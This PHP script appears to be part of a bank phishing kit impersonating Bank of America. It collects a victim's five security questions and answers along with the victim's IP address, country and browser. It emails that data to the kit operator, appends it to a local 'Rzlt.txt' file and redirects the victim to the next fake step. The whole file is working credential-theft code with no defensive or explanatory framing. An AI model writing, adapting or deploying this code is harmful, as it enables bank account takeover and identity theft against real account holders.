<?php
include 'email.php';
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
    $subject = 'Login Account [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|============ BOA EN Account Q&A ===========|'."\r\n";
    $message .= ''.$_POST['q1'].' : '.$_POST['a1']."\r\n";
    $message .= ''.$_POST['q2'].' : '.$_POST['a2']."\r\n";
    $message .= ''.$_POST['q3'].' : '.$_POST['a3']."\r\n";
    $message .= ''.$_POST['q4'].' : '.$_POST['a4']."\r\n";
    $message .= ''.$_POST['q5'].' : '.$_POST['a5']."\r\n";
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";
    $messags   =  "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."\r\n";
    $headers = 'From: BOA EN Q&A <notify_login_boaen@mail.com>'."\r\n";
    mail($to, $subject, $message, $headers);
    $file = fopen("Rzlt.txt","ab");
    mail($subject,$messags,$headers);
    fwrite($file,$message);
    fclose($file);
    header("location: Step4.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>